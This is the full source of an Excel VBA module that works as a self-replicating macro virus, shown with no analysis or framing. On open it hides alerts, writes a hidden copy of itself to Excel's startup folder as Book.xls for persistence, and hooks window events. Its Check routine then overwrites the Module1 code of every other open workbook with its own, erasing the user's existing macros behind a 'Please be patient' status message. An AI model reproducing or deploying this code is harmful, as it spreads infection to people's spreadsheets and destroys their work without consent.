   Attribute VB_Name = "Module1"
   Rem i

   Dim TM
   Dim TC

   Sub test()
       Application.OnWindow = "check"
   End Sub

   Sub Untest()
       Application.OnWindow = ""
   End Sub


   Sub Check_1()
       Check
   End Sub

   Sub Auto_Close()
       Application.OnWindow = ""
   End Sub

   Sub Auto_Open()
   Dim NameOfCurrentWorkBook As String
   Dim i
      Rem On Error Resume Next
      Application.ScreenUpdating = False
      Application.DisplayAlerts = False
      NameOfCurrentWorkBook = ThisWorkbook.Name
      If UCase(Dir(Application.StartupPath + "\Book.xls")) <> UCase("BOOK.xls") Then
       If NameOfCurrentWorkBook <> "Book.xls" Then
           Rem  Writing Book1 an Setting OnWindow
           If Workbooks.Count > 1 Then
               For i = 1 To Workbooks.Count ' check for Workbook with name Book1.xls
                   If Workbooks(i).Name = "Book.xls" Then
                       Workbooks(i).Close
                   End If
               Next i
           End If
           Rem writing Book1
           Set TM = ThisWorkbook.VBProject.VBComponents("module1").CodeModule
           Set NewBook1 = Application.Workbooks.Add
           Set TC = NewBook1.VBProject.VBComponents.Add(1).CodeModule
           For j = 1 To TM.CountOfLines
                TC.InsertLines j, TM.Lines(j, 1)
           Next j
           NewBook1.Activate
           ActiveWindow.Visible = False
           NewBook1.SaveAs FileName:=Application.StartupPath + "\Book.xls", AddToMru:=False
        End If
       End If
       Application.OnWindow = "Check_1"
       Application.ScreenUpdating = True
       Application.DisplayAlerts = True
   End Sub

   Sub Check()
   Dim oldStatusBar
   Dim QuantOfModules
   Dim i, j As Integer
   Dim ModuleExist As Boolean
   Dim NameOfCurrentModule As String
   Dim NewBook1

   oldStatusBar = Application.DisplayStatusBar
   Application.DisplayStatusBar = True
   Application.ScreenUpdating = False
   Application.DisplayAlerts = False
   Rem On Error Resume Next
   Set TM = ThisWorkbook.VBProject.VBComponents("module1").CodeModule
   If TM <> Empty Then
       If Workbooks.Count > 1 Then
           For i = 2 To Workbooks.Count
               ModuleExist = False
               For j = 1 To Workbooks(i).VBProject.VBComponents.Count
                   NameOfCurrentModule = Workbooks(i).VBProject.VBComponents.Item(j).Name
                   If NameOfCurrentModule = "Module1" Then
                       ModuleExist = True
                   End If
               Next j
               If ModuleExist <> True Then
                   Set TC = Workbooks(i).VBProject.VBComponents.Add(1).CodeModule
               Else
                   Set TC = Workbooks(i).VBProject.VBComponents("module1").CodeModule
               End If

               FirstLine = TC.Lines(1, 1)
               If FirstLine <> "Rem i" Then
                   For l = 1 To TC.CountOfLines
                       TC.DeleteLines l, 1
                       Application.StatusBar = "Please be patient...-" + Str(l)
                   Next l
                   For j = 1 To TM.CountOfLines
                       TC.InsertLines j, TM.Lines(j, 1)
                       Application.StatusBar = "Please be patient...-" + Str(j)
                   Next j
               End If
           Next i
       End If
   End If
   Application.StatusBar = False
   Application.DisplayStatusBar = oldStatusBar
   Application.ScreenUpdating = True
   Application.DisplayAlerts = True
   End Sub
